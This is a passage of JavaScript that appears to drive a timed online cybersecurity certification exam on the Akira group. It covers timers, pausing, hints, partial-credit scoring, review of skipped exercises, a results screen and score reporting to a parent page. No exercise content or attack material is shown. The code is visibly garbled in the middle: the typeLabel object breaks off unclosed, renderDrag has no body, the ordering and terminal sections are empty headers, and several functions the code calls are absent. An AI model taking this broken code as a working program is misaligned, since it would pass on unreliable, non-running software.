      t.remain -= dt; t.msRun += dt;
      if (S.exT.remain > 0) {
        S.exT.remain -= dt;
        if (S.exT.remain <= 0) { S.exT.remain = 0; onExerciseTimerExpired(); }
      }
      if (t.remain <= 0) { t.remain = 0; t.state = 'ENDED'; onMainTimerEnd(); }
    } else if (t.state === 'PAUSED_MANUAL') { t.msManual += dt; }
    else if (t.state === 'PAUSED_AUTO_CHECK') { t.msAuto += dt; }
    updateTimerUI();
  }, 250);

  function onMainTimerEnd() {
    if (S.phase === 'exam' && S.cur && !S.cur.checked && S.rec[S.cur.ex.id] == null) {
      S.rec[S.cur.ex.id] = { status: 'skipped', credit: 0 };
      if (S.skipped.indexOf(S.cur.ex.id) < 0) { S.skipped.push(S.cur.ex.id); }
    }
    S.reviewNote = 'The exam timer ended. Unanswered exercises were excluded from the score.';
    finalSubmit();
  }
  function onExerciseTimerExpired() {
    if (S.phase !== 'exam' || !S.cur || S.cur.checked) { return; }
    var cur = S.cur;
    if (S.rec[cur.ex.id] == null) {
      S.rec[cur.ex.id] = { status: 'skipped', credit: 0 };
      if (S.skipped.indexOf(cur.ex.id) < 0) { S.skipped.push(cur.ex.id); }
    }
    S.autoSkipNote = 'One exercise was auto-skipped: its reduced 3-minute timer ran out. You can return to it from the review screen.';
    if (S.pos < S.order.length - 1) { S.pos++; loadExercise(S.pos, false); }
    else { finishFlow(); }
  }

  /* ---------- top bar ---------- */
  function buildTopbar() {
    var tb = $('#topbar');
    tb.innerHTML = '';
    tb.appendChild(el('span', 'tb-item', '')).id = 'tb-counter';
    var b = el('span', 'tb-item'); b.id = 'tb-badge'; tb.appendChild(b);
    var t = el('span', 'tb-item'); t.id = 'tb-timer'; tb.appendChild(t);
    var x = el('span', 'tb-item'); x.id = 'tb-extimer'; x.classList.add('hidden'); tb.appendChild(x);
    var sc = el('span', 'tb-item'); sc.id = 'tb-score'; tb.appendChild(sc);
    tb.appendChild(el('span', 'spacer'));
    var hb = el('button', 'btn', '💡 Hint'); hb.id = 'tb-hint'; hb.type = 'button';
    hb.addEventListener('click', useHint); tb.appendChild(hb);
    var pb = el('button', 'btn ghost', '⏸ Pause'); pb.id = 'tb-pause'; pb.type = 'button';
    pb.addEventListener('click', manualPause); tb.appendChild(pb);
    var sb = el('button', 'btn ghost', '⏭ Skip'); sb.id = 'tb-skip'; sb.type = 'button';
    sb.addEventListener('click', skipCurrent); tb.appendChild(sb);
  }
  function renderTopbar() {
    if (!S) { return; }
    var badge = $('#tb-badge'), lab = TIMER_LABEL[S.timer.state];
    badge.innerHTML = '';
    var bs = el('span', 'badge ' + E.badge.cls, E.badge.label); badge.appendChild(bs);
    $('#tb-counter').textContent = S.phase === 'review' ? 'Review — skipped exercises'
      : (S.phase === 'exam' ? 'Exercise ' + (S.pos + 1) + ' of ' + S.order.length : '');
    updateTimerUI(); updateScoreUI();
    var hintOff = !S.cur || S.cur.hintUsed || S.cur.checked || S.phase !== 'exam';
    $('#tb-hint').disabled = hintOff;
    $('#tb-skip').disabled = !S.cur || S.cur.checked || S.phase !== 'exam';
    $('#tb-pause').disabled = S.phase !== 'exam' && S.phase !== 'review';
  }
  function updateTimerUI() {
    var t = $('#tb-timer'); if (!t || !S) { return; }
    var lab = TIMER_LABEL[S.timer.state];
    t.innerHTML = '';
    t.appendChild(el('span', null, '⏱ ' + fmt(S.timer.remain)));
    t.appendChild(el('span', 'tb-timer-state ' + lab[2], lab[0] + ' ' + lab[1]));
    var x = $('#tb-extimer');
    if (S.exT.total > 0 && S.phase === 'exam' && S.cur && S.cur.ex && S.cur.ex.term && S.cur.ex.term.exTimer) {
      x.classList.remove('hidden');
      x.textContent = 'Exercise timer ' + fmt(S.exT.remain) + ' / ' + fmt(S.exT.total);
    } else { x.classList.add('hidden'); }
  }
  function updateScoreUI() {
    var sc = $('#tb-score'); if (!sc) { return; }
    var pct = S.answered > 0 ? Math.round((S.creditSum / S.answered) * 100) : 0;
    sc.textContent = 'Score ' + S.creditSum.toFixed(1) + ' / ' + S.answered + ' (' + pct + '%)';
  }

  /* ---------- screens ---------- */
  function showScreen(name) {
    ['intro', 'exam', 'review', 'results'].forEach(function (n) {
      $('#scr-' + n).classList.toggle('hidden', n !== name);
    });
    $('#topbar').classList.toggle('hidden', name === 'intro');
    renderTopbar();
  }

  /* ---------- intro (exactly four sections: header strip, What you will learn here,
     Keywords covered in this exam, How this exam works ending with the Start button) ---------- */
  function renderIntro() {
    var s = $('#scr-intro'); s.innerHTML = '';
    var wrap = el('div', 'wrap');

    /* 1 — header strip: title, exercise count, severity, estimated time, timer budget, pass mark */
    var strip = el('section', 'intro-strip');
    strip.appendChild(el('h1', null, 'G1024 Akira — ' + E.badge.label + ' certification exam'));
    var chips = el('div', 'chips');
    chips.appendChild(el('span', 'badge ' + E.badge.cls, E.badge.label));
    [E.exercises.length + ' exercises', 'Estimated time: ~' + E.minutes + ' min',
     'Timer budget: ' + fmt(E.minutes * 60), 'Pass mark: ' + E.meta.passMark + '%'].forEach(function (t) {
      chips.appendChild(el('span', 'tb-item', t));
    });
    strip.appendChild(chips);
    wrap.appendChild(strip);

    /* 2 — What you will learn here (B1 entity explanation: object type + real-work areas) */
    var pLearn = el('section', 'intro-sec');
    pLearn.appendChild(el('h2', null, 'What you will learn here'));
    pLearn.appendChild(el('p', 'typenote', 'ATT&CK object type: ' + E.intro.entityType));
    E.intro.entity.forEach(function (t) { pLearn.appendChild(el('p', null, t)); });
    pLearn.appendChild(el('p', null, 'Where you will use this knowledge at work:'));
    var ul = el('ul', 'workareas');
    E.intro.workareas.forEach(function (t) { ul.appendChild(el('li', null, t)); });
    pLearn.appendChild(ul);
    E.intro.entityClose.forEach(function (t) { pLearn.appendChild(el('p', null, t)); });
    wrap.appendChild(pLearn);

    /* 3 — Keywords covered in this exam (only concepts exercised in THIS file) */
    var pKeys = el('section', 'intro-sec');
    pKeys.appendChild(el('h2', null, 'Keywords covered in this exam'));
    pKeys.appendChild(el('p', 'serifnote', E.intro.kwnote));
    E.themes.forEach(function (th) {
      var d = el('div', 'theme');
      d.appendChild(el('h4', null, th.name));
      th.items.forEach(function (it) { d.appendChild(el('span', 'kw', it.label)); });
      pKeys.appendChild(d);
    });
    wrap.appendChild(pKeys);

    /* 4 — How this exam works: exam shape, severity, passing score, exercise types,
       timer + both pauses, partial credit, skip rules — ends with the Start button */
    var pHow = el('section', 'intro-sec');
    pHow.appendChild(el('h2', null, 'How this exam works'));
    E.intro.about.forEach(function (t) { pHow.appendChild(el('p', null, t)); });
    pHow.appendChild(el('p', null, E.intro.severity));
    E.intro.rules.forEach(function (t) { pHow.appendChild(el('p', null, t)); });
    var act = el('div', 'actionrow');
    var greet = el('span', 'serifnote', S.greeting || '');
    greet.id = 'greet';
    act.appendChild(greet);
    var start = el('button', 'btn primary', '▶ Start exam');
    start.type = 'button'; start.id = 'start-btn';
    start.addEventListener('click', startExam);
    act.appendChild(start);
    pHow.appendChild(act);
    wrap.appendChild(pHow);

    s.appendChild(wrap);
  }

  /* ---------- exercise loading & preparation ---------- */
  function prep(ex) {
    var p = { ex: ex, ui: {} };
    if (ex.type === 'qcm' || ex.type === 'multi') {
      p.ui.picked = [];
      p.opts = shuffle(ex.options.map(function (lb, i) {
        return { id: 'o' + i, label: lb, correct: ex.correct.indexOf(i) >= 0 };
      }));
    } else if (ex.type === 'drag') {
      p.ui.place = {}; p.ui.sel = null; p.ui.moved = false;
      ex.items.forEach(function (it) { p.ui.place[it.id] = '_bank'; });
      p.items = shuffle(ex.items);
    } else if (ex.type === 'match') {
      p.ui.pairs = {}; p.ui.selL = null;
      p.lefts = shuffle(ex.pairs.map(function (pr, i) { return { id: 'L' + i, label: pr[0] }; }));
      p.rights = shuffle(ex.pairs.map(function (pr, i) { return { id: 'R' + i, label: pr[1] }; }));
      p.sol = {}; ex.pairs.forEach(function (pr, i) { p.sol['L' + i] = 'R' + i; });
    } else if (ex.type === 'order') {
      p.ui.list = shuffle(ex.items.map(function (lb, i) { return { id: 'i' + i, label: lb }; }));
    } else if (ex.type === 'fill') {
      p.ui.picks = ex.blanks.map(function () { return ''; });
      p.bank = shuffle(ex.bank);
    } else if (ex.type === 'terminal') {
      p.ui.lines = []; p.ui.lastCmd = null;
    } else if (ex.type === 'branch') {
      p.ui.step = 0; p.ui.choices = [];
      p.stepOpts = ex.steps.map(function (st) {
        return shuffle(st.options.map(function (lb, i) {
          return { id: 's' + i, label: lb, correct: i === st.correct };
        }));
      });
    }
    return p;
  }

  function loadExercise(pos, fromReview) {
    var exId = S.order[pos];
    var ex = E.exercises.filter(function (e) { return e.id === exId; })[0];
    S.pos = pos;
    S.cur = prep(ex);
    S.cur.checked = false;
    S.cur.hintUsed = S.cur.hintUsed || false;
    S.cur.fromReview = !!fromReview;
    if (ex.term && ex.term.exTimer) { S.exT = { total: ex.term.exTimer, remain: ex.term.exTimer }; }
    else { S.exT = { total: 0, remain: 0 }; }
    renderExercise();
    setTimer(S.timer.state === 'ENDED' ? 'ENDED' : 'RUNNING');
  }

  /* ---------- rendering one exercise ---------- */
  function renderExercise() {
    var p = S.cur, ex = p.ex;
    var card = $('#excard'); card.innerHTML = '';
    var head = el('div', 'panel');
    head.style.marginTop = '10px';
    head.appendChild(el('h2', null, ex.name));
    head.appendChild(el('p', 'typenote', typeLabel(ex)));
    card.appendChild(head);

    /* SCENARIO */
    var sc = el('section', 'blk blk-scenario');
    var sch = el('h3', null, '📋 SCENARIO');
    sch.appendChild(el('span', 'blk-sum', ex.summary));
    var cb = el('button', 'collapse-btn', 'Collapse'); cb.type = 'button';
    cb.setAttribute('aria-expanded', 'true');
    var scb = el('div', 'blk-body');
    cb.addEventListener('click', function () {
      var open = scb.classList.toggle('hidden') === false;
      cb.textContent = open ? 'Collapse' : 'Expand';
      cb.setAttribute('aria-expanded', open ? 'true' : 'false');
    });
    sch.appendChild(cb);
    sc.appendChild(sch);
    (ex.scenario || []).forEach(function (a) { scb.appendChild(renderArtefact(a, p)); });
    var hintSlot = el('div', 'hintbox hidden'); hintSlot.id = 'hint-slot';
    if (p.hintUsed) {
      hintSlot.classList.remove('hidden');
      hintSlot.textContent = '💡 Hint (−10% of this exercise’s credit): ' + ex.hint;
    }
    scb.appendChild(hintSlot);
    sc.appendChild(scb);
    card.appendChild(sc);

    /* QUESTION */
    var q = el('section', 'blk blk-question');
    q.appendChild(el('h3', null, '❓ QUESTION'));
    var qb = el('div', 'blk-body');
    var qp = el('p'); qp.id = 'question-text';
    var qraw = ex.type === 'branch' ? ex.steps[p.ui.step].q : ex.question;
    var strong = el('strong', null, String(qraw).replace(/^STEP \d+ OF \d+ — /, ''));
    qp.appendChild(strong); qb.appendChild(qp);
    if (ex.type === 'branch') {
      qb.insertBefore(el('p', 'typenote', 'STEP ' + (p.ui.step + 1) + ' OF ' + ex.steps.length + ' — answer one step at a time. The timer only stops on the final Check.'), qp);
    }
    q.appendChild(qb);
    card.appendChild(q);

    /* YOUR ANSWER */
    var aw = el('section', 'blk blk-answer');
    aw.appendChild(el('h3', null, '✍️ YOUR ANSWER'));
    var ab = el('div', 'blk-body'); ab.id = 'answer-body';
    renderAnswer(ab, p);
    aw.appendChild(ab);
    card.appendChild(aw);

    /* actions */
    var act = el('div', 'actionrow');
    var check = el('button', 'btn primary', '✔ Check answer'); check.type = 'button'; check.id = 'btn-check';
    check.addEventListener('click', checkCurrent);
    act.appendChild(check);
    var nxt = el('button', 'btn warn hidden', isLastPos() ? '➤ Final Submit' : 'Next exercise ➤');
    nxt.type = 'button'; nxt.id = 'btn-next';
    nxt.addEventListener('click', nextFromExercise);
    act.appendChild(nxt);
    card.appendChild(act);

    var fb = $('#fb'); fb.innerHTML = '';
    if (ex.type === 'branch' && p.ui.step < ex.steps.length - 1) { check.disabled = true; }
    card.scrollIntoView({ behavior: 'auto', block: 'start' });
  }

  function typeLabel(ex) {
    var m = {
      qcm: 'Single choice — one correct answer.',
      multi: 'Select all that apply — partial credit per item.',
      drag: 'Drag & drop — partial credit per item.',
      match: 'Matching — partial credit per pair.',
      order: 'Ordering — partial credit per position.',
      fill: 'Fill in the blanks — partial credit per blank.',
      terminal: 'Terminal — type the command, then Check. Partial credit per element.',

  function renderDrag(ab, p) {

  /* ----- ordering ----- */

  /* ----- terminal ----- */

    var ex = p.ex, ui = p.ui;

  /* ---------- hints ---------- */
  function useHint() {
    if (!S.cur || S.cur.hintUsed || S.cur.checked) { return; }
    S.cur.hintUsed = true;
    var hs = $('#hint-slot');
    hs.classList.remove('hidden');
    hs.textContent = '💡 Hint (−10% of this exercise’s credit): ' + S.cur.ex.hint;
    renderTopbar();
  }

  /* ---------- manual pause ---------- */
  function manualPause() {
    if (S.timer.state === 'ENDED' || S.timer.state === 'PAUSED_MANUAL') { return; }
    S.prevTimer = S.timer.state;
    setTimer('PAUSED_MANUAL');
    document.body.classList.add('manually-paused');
    var ov = $('#pause-overlay'); ov.classList.remove('hidden');
  }
  function resumeManual() {
    document.body.classList.remove('manually-paused');
    $('#pause-overlay').classList.add('hidden');
    setTimer(S.prevTimer === 'PAUSED_AUTO_CHECK' ? 'PAUSED_AUTO_CHECK' : 'RUNNING');
  }

  /* ---------- check / grading / feedback ---------- */
  function checkCurrent() {
    var p = S.cur; if (!p || p.checked) { return; }
    if (p.ex.type === 'branch' && p.ui.step < p.ex.steps.length - 1) { return; }
    var sel, correct, wrongs = [], note = null;
    if (p.ex.type === 'order') {
      var H = 0, N = p.ex.items.length;
      p.collect().forEach(function (k, i) { if (k === p.correctItems()[i]) { H++; } });
      var credit0 = Math.max(0, (H - (N - H)) / N);
      sel = p.collect(); correct = p.correctItems();
      p.creditOverride = credit0;
      p.Hn = H; p.Wn = N - H;
    } else if (p.ex.type === 'terminal') {
      var n = normCmd(p.ui.lastCmd);
      if (!n) {
        note = 'You did not run a command in the shell. Type the command and press Enter first, then Check.';
        sel = []; correct = p.correctItems();
      } else {
        sel = p.collect().concat(p.extraWrongs());
        correct = p.correctItems();
      }
    } else {
      sel = p.collect(); correct = p.correctItems();
      if (p.extraWrongs) { sel = sel.concat(p.extraWrongs()); }
    }
    var credit = (p.creditOverride != null) ? p.creditOverride : scoreExercise(sel, correct);
    if (p.hintUsed) { credit = Math.max(0, credit - 0.10); }
    p.checked = true;
    S.rec[p.ex.id] = { status: 'answered', credit: credit };
    S.answered++; S.creditSum += credit;
    setTimer('PAUSED_AUTO_CHECK');  /* mandatory auto-pause before feedback render */
    renderFeedback(p, sel, correct, credit, note);
    var check = $('#btn-check'); check.classList.add('hidden');
    var nxt = $('#btn-next'); nxt.classList.remove('hidden');
    nxt.textContent = isLastPos() && !p.fromReview ? '➤ Final Submit' : (p.fromReview ? '↩ Back to review' : 'Next exercise ➤');
    renderTopbar();
  }

  function renderFeedback(p, sel, correct, credit, note) {
    var fb = $('#fb'); fb.innerHTML = '';
    var full = credit >= 0.9999, zero = credit <= 0.0001;
    var box = el('div', 'fb ' + (full ? 'fb-ok' : (zero ? 'fb-bad' : 'fb-part')));
    var head = el('div', 'fb-head');
    head.appendChild(el('span', null, full ? '✓ CORRECT' : (zero ? '✗ INCORRECT' : '✓ PARTIALLY CORRECT')));
    box.appendChild(head);
    var body = el('div', 'fb-body');
    var N = correct.length;
    if (N > 1 || p.ex.type === 'terminal' || p.ex.type === 'order') {
      var Hn = 0, Wn = 0, i;
      var hitMap = {};
      sel.forEach(function (k) { hitMap[k] = (hitMap[k] || 0) + 1; });
      correct.forEach(function (k) { if (hitMap[k] > 0) { Hn++; hitMap[k]--; } });
      Object.keys(hitMap).forEach(function (k) { if (hitMap[k] > 0 && correct.indexOf(k) < 0) { Wn += hitMap[k]; } });
      if (p.Hn != null) { Hn = p.Hn; Wn = p.Wn; }
      body.appendChild(el('p', 'creditline', 'Credit ' + credit.toFixed(2) + ' — ' + Hn + '/' + N + ' correct items, ' + Wn + ' wrong selection' + (Wn === 1 ? '' : 's') + '. Formula: (H − W) ÷ N = (' + Hn + ' − ' + Wn + ') ÷ ' + N + '.' + (p.hintUsed ? ' Includes the −0.10 hint cost.' : '')));
      var items = el('div', 'items');
      correct.forEach(function (k) {
        var got = hitMap[k] > 0; if (got) { hitMap[k]--; }
        var row = el('div', 'itemrow');
        row.appendChild(el('span', 'ic ' + (got ? 'ic-ok' : 'ic-miss'), got ? '✓' : '○'));
        row.appendChild(el('span', null, (got ? 'Correct — ' : 'Missed — ') + itemText(p, k)));
        items.appendChild(row);
      });
      sel.forEach(function (k) {
        if (correct.indexOf(k) < 0 && hitMap[k] > 0) { hitMap[k]--; }
      });
      Object.keys(hitMap).forEach(function (k) {
        for (var j = 0; j < hitMap[k]; j++) {
          if (correct.indexOf(k) >= 0) { continue; }
          var row = el('div', 'itemrow');
          row.appendChild(el('span', 'ic ic-bad', '✗'));
          row.appendChild(el('span', null, 'Wrong — ' + itemText(p, k)));
          items.appendChild(row);
        }
      });
      body.appendChild(items);
    } else {
      body.appendChild(el('p', 'creditline', 'Credit ' + credit.toFixed(2) + '.' + (p.hintUsed ? ' Includes the −0.10 hint cost.' : '')));
    }
    if (note) { body.appendChild(el('p', null, note)); }
    p.ex.explain.split('\n\n').forEach(function (par) { body.appendChild(el('p', null, par)); });
    if (p.ex.type === 'terminal') {
      body.appendChild(el('p', null, 'Canonical command (copyable):'));
      var cp = el('pre', 'code'); cp.appendChild(el('code', null, p.ex.term.canonical));
      body.appendChild(cp);
      var cpb = el('button', 'btn ghost', 'Copy command'); cpb.type = 'button';
      cpb.addEventListener('click', function () {
        try { navigator.clipboard.writeText(p.ex.term.canonical); cpb.textContent = 'Copied ✓'; } catch (e) { cpb.textContent = 'Copy not available'; }
      });
      body.appendChild(cpb);
      p.ex.term.parts.forEach(function (pt) { body.appendChild(el('p', null, '• ' + pt)); });
    }
    if (p.ex.type === 'branch') {
      p.ex.steps.forEach(function (st, i) {
        body.appendChild(el('p', null, 'Step ' + (i + 1) + ' — why: ' + st.why));
      });
    }
    if (credit < 0.9999 && p.ex.study) {
      body.appendChild(el('div', 'whatstudy', 'What to study: ' + p.ex.study));
    }
    box.appendChild(body);
    fb.appendChild(box);
  }
  function itemText(p, key) {
    if (p.itemLabel) { try { return p.itemLabel(key); } catch (e) { return key; } }
    var p2 = S.cur;
    if (p2.ex.type === 'qcm' || p2.ex.type === 'multi') {
      var o = p2.opts.filter(function (x) { return x.id === key; })[0];
      return o ? o.label : key;
    }
    return key;
  }

  /* ---------- navigation flow ---------- */
  function isLastPos() { return S.pos >= S.order.length - 1; }
  function nextFromExercise() {
    if (!S.cur || !S.cur.checked) { return; }
    if (S.cur.fromReview) { showReview(); setTimer('RUNNING'); return; }
    if (!isLastPos()) { loadExercise(S.pos + 1, false); }
    else { finishFlow(); }
  }
  function skipCurrent() {
    if (!S.cur || S.cur.checked) { return; }
    if (S.rec[S.cur.ex.id] == null) {
      S.rec[S.cur.ex.id] = { status: 'skipped', credit: 0 };
      if (S.skipped.indexOf(S.cur.ex.id) < 0) { S.skipped.push(S.cur.ex.id); }
    }
    if (S.cur.fromReview) { showReview(); return; } /* leave it unanswered in the pool */
    if (!isLastPos()) { loadExercise(S.pos + 1, false); }
    else { finishFlow(); }
  }
  function finishFlow() {
    var pending = S.skipped.filter(function (id) { return S.rec[id] && S.rec[id].status === 'skipped'; });
    if (pending.length && S.timer.state !== 'ENDED' && S.timer.remain > 0) { showReview(); }
    else { finalSubmit(); }
  }
  function showReview() {
    S.phase = 'review'; showScreen('review');
    var s = $('#scr-review'); s.innerHTML = '';
    var w = el('div', 'wrap');
    w.appendChild(el('h2', null, 'Review skipped exercises'));
    if (S.autoSkipNote) { w.appendChild(el('div', 'banner', '⚠ ' + S.autoSkipNote)); }
    if (S.reviewNote) { w.appendChild(el('div', 'banner', '⚠ ' + S.reviewNote)); }
    w.appendChild(el('p', null, 'You can return to any skipped exercise and answer it while the timer runs. You may do this as many times as you need. If you submit with exercises still unanswered, they are excluded from the score — they count neither for you nor against you.'));
    S.skipped.forEach(function (id) {
      if (!S.rec[id] || S.rec[id].status !== 'skipped') { return; }
      var ex = E.exercises.filter(function (e) { return e.id === id; })[0];
      var row = el('div', 'reviewrow');
      row.appendChild(el('span', 'rv-name', 'Exercise — ' + ex.name));
      var b = el('button', 'btn primary', 'Answer it');
      b.type = 'button';
      b.addEventListener('click', function () { S.phase = 'exam'; showScreen('exam'); loadExercise(S.order.indexOf(id), true); });
      row.appendChild(b);
      w.appendChild(row);
    });
    if (!S.skipped.length) { w.appendChild(el('p', null, 'Nothing skipped — well done.')); }
    var act = el('div', 'actionrow');
    var sub = el('button', 'btn warn', '➤ Submit exam');
    sub.type = 'button'; sub.addEventListener('click', finalSubmit);
    act.appendChild(sub);
    w.appendChild(act);
    s.appendChild(w);
  }

  /* ---------- results & reporting ---------- */
  function finalSubmit() {
    setTimer('ENDED');
    S.phase = 'results';
    var answeredIds = [], skippedUn = 0, full = 0, part = [], zero = 0;
    Object.keys(S.rec).forEach(function (id) {
      var r = S.rec[id];
      if (r.status === 'answered') {
        answeredIds.push(id);
        if (r.credit >= 0.9999) { full++; }
        else if (r.credit > 0) { part.push(r.credit); }
        else { zero++; }
      } else { skippedUn++; }
    });
    var sum = 0; answeredIds.forEach(function (id) { sum += S.rec[id].credit; });
    var pct = answeredIds.length > 0 ? Math.round((sum / answeredIds.length) * 100) : 0;
    var passed = pct >= E.meta.passMark;
    /* render */
    var s = $('#scr-results'); s.innerHTML = '';
    var w = el('div', 'wrap');
    var cert = el('div', passed ? 'cert' : 'certfail');
    cert.appendChild(el('div', 'bigpct', pct + '%'));
    cert.appendChild(el('h2', null, passed ? '🎉 PASS — certified' : '✗ FAIL — below the pass mark'));
    cert.appendChild(el('p', null, passed
      ? 'You reached ' + pct + '% on ' + E.badge.label + ' tier for ' + E.meta.title + '. Pass mark: ' + E.meta.passMark + '%.'
      : 'You scored ' + pct + '%. The pass mark is ' + E.meta.passMark + '%. Retake the exam — the exercises and answers are shuffled again.'));
    w.appendChild(cert);
    var tbl = el('table', 'restable');
    var avgPart = part.length ? (part.reduce(function (a, b) { return a + b; }, 0) / part.length) : 0;
    [['Fully correct', full], ['Partially correct', part.length + (part.length ? ' (avg credit ' + avgPart.toFixed(2) + ')' : '')],
     ['Fully incorrect', zero], ['Skipped, never answered (excluded)', skippedUn]].forEach(function (r, i) {
      var tr = el('tr');
      tr.appendChild(el(i === 0 ? 'th' : 'td', null, r[0]));
      tr.appendChild(el('td', null, String(r[1])));
      tbl.appendChild(tr);
    });
    w.appendChild(tbl);
    var time = el('div', 'panel');
    time.appendChild(el('h3', null, 'How your time was spent'));
    time.appendChild(el('p', null, 'Answering (timer running): ' + fmt(S.timer.msRun)));
    time.appendChild(el('p', null, 'Paused for feedback review (after Check): ' + fmt(S.timer.msAuto)));
    time.appendChild(el('p', null, 'Manual breaks (Pause button): ' + fmt(S.timer.msManual)));
    if (S.autoSkipNote) { time.appendChild(el('div', 'banner', '⚠ ' + S.autoSkipNote)); }
    w.appendChild(time);
    var act = el('div', 'actionrow');
    var rt = el('button', 'btn primary', '↻ Retake exam');
    rt.type = 'button'; rt.addEventListener('click', retake);
    act.appendChild(rt);
    w.appendChild(act);
    s.appendChild(w);
    showScreen('results');
    /* report exactly once per attempt, at the results screen */
    if (!S.reported) {
      S.reported = true;
      reportScore(sum, answeredIds.length);
    }
  }
  function reportScore(creditSum, answeredCount) {
    var percent = answeredCount > 0 ? Math.round((creditSum / answeredCount) * 100) : 0;
    try {
      parent.postMessage({
        type: 'CYBERPULSE_SCORE',
        topicId: E.meta.topicId,
        batch: E.meta.batch,
        score: Math.round(creditSum),
        total: answeredCount,
        percent: percent,
        passed: percent >= E.meta.passMark
      }, location.origin);
    } catch (e) { /* Opened directly rather than inside the site. Nothing to report to. */ }
  }
  function retake() {
    var g = S.greeting;
    S = freshState();
    S.greeting = g || '';
    startExam();
  }

  /* ---------- exam start & boot ---------- */
  function startExam() {
    S.phase = 'exam';
    S.order = shuffle(E.exercises.map(function (e) { return e.id; }));
    S.lastTick = Date.now();
    setTimer('RUNNING');
    showScreen('exam');
    loadExercise(0, false);
  }
  /* handshake with the parent site (optional; works standalone too) */
  var pendingGreeting = null;
  window.addEventListener('message', function (event) {
    if (!event.data) { return; }
    if (event.data.type !== 'CYBERPULSE_INIT' && event.data.type !== 'CYBERMASTERY_INIT') { return; }
    try {
      var g = '';
      if (event.data.username) { g = 'Ready, ' + event.data.username + ' — good luck!'; }
      if (g) {
        pendingGreeting = g;
        if (S) { S.greeting = g; var gr = $('#greet'); if (gr) { gr.textContent = g; } }
      }
    } catch (e) { /* ignore handshake issues; the exam works standalone */ }
  });

  document.addEventListener('DOMContentLoaded', function () {
    S = freshState();
    if (pendingGreeting) { S.greeting = pendingGreeting; }
    buildTopbar();
    var pv = $('#pause-resume');
    if (pv) { pv.addEventListener('click', resumeManual); }
    renderIntro();
    showScreen('intro');
  });
})();

</script>
</body>
</html>
